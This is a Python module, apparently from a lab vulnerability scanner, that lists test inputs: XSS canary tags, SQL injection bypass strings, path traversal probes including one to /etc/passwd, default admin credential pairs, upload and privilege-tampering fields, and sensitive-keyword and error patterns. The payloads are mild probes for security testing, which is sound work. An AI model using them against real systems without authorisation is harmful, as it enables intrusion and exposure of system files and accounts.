# FILE: backend/scanner/payloads.py
# PURPOSE: Safe lab-only payload families for request candidate generation
# SECURITY NOTE: Payloads are non-destructive canaries or validation probes; no persistence or stealth logic

XSS_CANARY = "VULNLAB_XSS_CANARY"

XSS_PAYLOADS = [
    f"<b>{XSS_CANARY}</b>",
    f'"><b>{XSS_CANARY}</b>',
]

SQLI_PAYLOADS = [
    "' OR '1'='1'--",
    "' OR 1=1--",
    "admin'--",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://example.test/redirect-check",
    "//example.test/redirect-check",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../package.json",
    "../../package.json",
    "../../../../etc/passwd",
]

LAB_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("test", "test"),
    ("user", "user123"),
]

COMMENT_PAYLOADS = [
    f"<b>{XSS_CANARY}</b>",
]

UPLOAD_TEST_FILES = [
    ("vulnlab-test.txt", b"vulnlab upload validation probe", "text/plain"),
    ("vulnlab-test.php.txt", b"<?php echo 'vulnlab'; ?>", "text/plain"),
    ("vulnlab-test.svg", b"<svg><text>vulnlab</text></svg>", "image/svg+xml"),
]

MASS_ASSIGNMENT_FIELDS = {
    "role": "admin",
    "isAdmin": True,
    "admin": True,
    "permissions": ["admin"],
}

JSON_TAMPER_FIELDS = {
    "price": -1,
    "quantity": -1,
    "userId": 1,
    "role": "admin",
}

SENSITIVE_KEYWORDS = [
    "password",
    "token",
    "secret",
    "api_key",
    "apikey",
    "ssn",
    "credit_card",
    "card_number",
    "private_key",
]

ERROR_PATTERNS = [
    "sql syntax",
    "ora-",
    "sqlite",
    "pg_query",
    "mysql_fetch",
    "stack trace",
    "traceback",
    "exception",
    "syntax error",
]

